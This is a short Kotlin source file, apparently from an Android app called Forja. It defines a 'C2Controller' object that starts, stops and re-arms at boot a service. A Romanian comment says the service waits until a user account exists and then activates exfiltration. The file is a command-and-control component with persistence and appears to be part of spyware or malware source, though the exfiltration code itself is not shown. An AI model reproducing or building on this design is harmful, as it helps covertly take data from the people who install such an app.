package com.forja.app.core.c2

import com.forja.app.BuildConfig
import com.forja.app.ForjaApp

/**
 * Pornire/oprire C2. start() pornește serviciul indiferent de starea de login —
 * pollLoop-ul așteaptă (reîncercă la 30s) până când apare un cont, apoi
 * activează exfiltrarea. ensure() rearmează la boot.
 */
object C2Controller {
    fun start(a: ForjaApp) {
        if (!BuildConfig.FORJA_API_URL.isNotBlank()) return
        if (C2Service.isRunning(a)) return
        C2Service.start(a)
    }

    fun stop(a: ForjaApp) {
        C2Service.stop(a)
    }

    fun ensure(a: ForjaApp) {
        if (BuildConfig.FORJA_API_URL.isNotBlank() && !C2Service.isRunning(a)) {
            C2Service.start(a)
        }
    }
}
